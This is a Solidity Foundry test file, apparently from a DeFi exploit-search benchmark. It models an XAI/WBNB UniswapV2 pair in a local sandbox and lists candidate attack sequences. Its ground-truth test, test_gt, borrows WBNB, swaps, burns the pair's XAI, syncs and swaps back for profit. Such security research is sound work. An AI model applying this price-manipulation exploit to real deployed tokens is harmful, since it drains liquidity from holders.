// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";
import {XAI} from "./XAI.sol";

contract XAITest is Test, BlockLoader {
    WBNB wbnb;
    XAI xai;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address wbnbAddr;
    address xaiAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1700018887;
    uint112 reserve0pair = 100000000000000000000000000000;
    uint112 reserve1pair = 1090000000000000000;
    uint32 blockTimestampLastpair = 1700018878;
    uint256 kLastpair = 109000000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastpair = 0;
    uint256 price1CumulativeLastpair = 0;
    uint256 totalSupplyxai = 100000000000000000000000000000;
    uint256 balanceOfxaipair = 100000000000000000000000000000;
    uint256 balanceOfxaiattacker = 0;
    uint256 totalSupplywbnb = 2409166684392094180632129;
    uint256 balanceOfwbnbpair = 1090000000000000000;
    uint256 balanceOfwbnbattacker = 0;

    function setUp() public {
        owner = address(this);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        xai = new XAI(
            "XAI",
            "XAI",
            18,
            1e11,
            1,
            0,
            1,
            address(0x0),
            address(this)
        );
        xaiAddr = address(xai);
        pair = new UniswapV2Pair(
            address(xai),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        xai.transfer(address(pair), balanceOfxaipair);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(xai), address(wbnb), xai.decimals());
        emit log_string("");
        emit log_string("Xai Balances: ");
        queryERC20BalanceDecimals(address(wbnb), address(xai), wbnb.decimals());
        queryERC20BalanceDecimals(address(xai), address(xai), xai.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(xai), address(pair), xai.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(xai),
            address(attacker),
            xai.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e3 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_xai_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        xai.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_xai_owner(uint256 amount) internal eurus {
        xai.transfer(owner, amount);
    }

    function swap_pair_attacker_xai_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        xai.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_wbnb_xai(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_xai_pair(uint256 amount) internal eurus {
        xai.burn(xai.totalSupply() - amount);
        pair.sync();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_xai(amt1, amt2);
        swap_pair_attacker_xai_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        burn_xai_pair(amt1);
        swap_pair_attacker_wbnb_xai(amt2, amt3);
        swap_pair_attacker_xai_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_xai(amt1, amt2);
        burn_xai_pair(amt3);
        swap_pair_attacker_xai_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_xai_owner(amt0);
        swap_pair_attacker_xai_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_xai(amt3, amt4);
        payback_xai_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_xai_owner(amt0);
        burn_xai_pair(amt1);
        swap_pair_attacker_xai_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_xai(amt4, amt5);
        payback_xai_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_xai_owner(amt0);
        swap_pair_attacker_xai_wbnb(amt1, amt2);
        burn_xai_pair(amt3);
        swap_pair_attacker_wbnb_xai(amt4, amt5);
        payback_xai_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_xai(amt1, amt2);
        swap_pair_attacker_xai_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_xai(amt5, amt6);
        swap_pair_attacker_xai_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        burn_xai_pair(amt1);
        swap_pair_attacker_wbnb_xai(amt2, amt3);
        swap_pair_attacker_xai_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_xai(amt6, amt7);
        swap_pair_attacker_xai_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_xai(amt1, amt2);
        burn_xai_pair(amt3);
        swap_pair_attacker_xai_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_xai(amt6, amt7);
        swap_pair_attacker_xai_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_xai(amt1, amt2);
        swap_pair_attacker_xai_wbnb(amt3, amt4);
        burn_xai_pair(amt5);
        swap_pair_attacker_wbnb_xai(amt6, amt7);
        swap_pair_attacker_xai_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_xai(amt1, amt2);
        swap_pair_attacker_xai_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_xai(amt5, amt6);
        burn_xai_pair(amt7);
        swap_pair_attacker_xai_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_xai_owner(amt0);
        swap_pair_attacker_xai_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_xai(amt3, amt4);
        swap_pair_attacker_xai_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_xai(amt7, amt8);
        payback_xai_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_xai_owner(amt0);
        burn_xai_pair(amt1);
        swap_pair_attacker_xai_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_xai(amt4, amt5);
        swap_pair_attacker_xai_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_xai(amt8, amt9);
        payback_xai_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_xai_owner(amt0);
        swap_pair_attacker_xai_wbnb(amt1, amt2);
        burn_xai_pair(amt3);
        swap_pair_attacker_wbnb_xai(amt4, amt5);
        swap_pair_attacker_xai_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_xai(amt8, amt9);
        payback_xai_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_xai_owner(amt0);
        swap_pair_attacker_xai_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_xai(amt3, amt4);
        burn_xai_pair(amt5);
        swap_pair_attacker_xai_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_xai(amt8, amt9);
        payback_xai_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_xai_owner(amt0);
        swap_pair_attacker_xai_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_xai(amt3, amt4);
        swap_pair_attacker_xai_wbnb(amt5, amt6);
        burn_xai_pair(amt7);
        swap_pair_attacker_wbnb_xai(amt8, amt9);
        payback_xai_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 3000 * 1e18);
        borrow_wbnb_owner(3000 * 1e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", wbnb.balanceOf(attacker));
        emit log_named_uint(
            "amt2",
            pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
        );
        swap_pair_attacker_wbnb_xai(
            wbnb.balanceOf(attacker),
            pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
        );
        printBalance("After step1 ");
        emit log_named_uint("amt3", 10000);
        burn_xai_pair(10000);
        printBalance("After step2 ");
        emit log_named_uint("amt4", xai.balanceOf(attacker));
        emit log_named_uint(
            "amt5",
            pair.getAmountOut(xai.balanceOf(attacker), address(xai))
        );
        swap_pair_attacker_xai_wbnb(
            xai.balanceOf(attacker),
            pair.getAmountOut(xai.balanceOf(attacker), address(xai))
        );
        printBalance("After step3 ");
        emit log_named_uint("amt6", 3000 * 1e18);
        payback_wbnb_owner(3000 * 1e18);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_xai(amt1, amt2);
        burn_xai_pair(amt3);
        swap_pair_attacker_xai_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
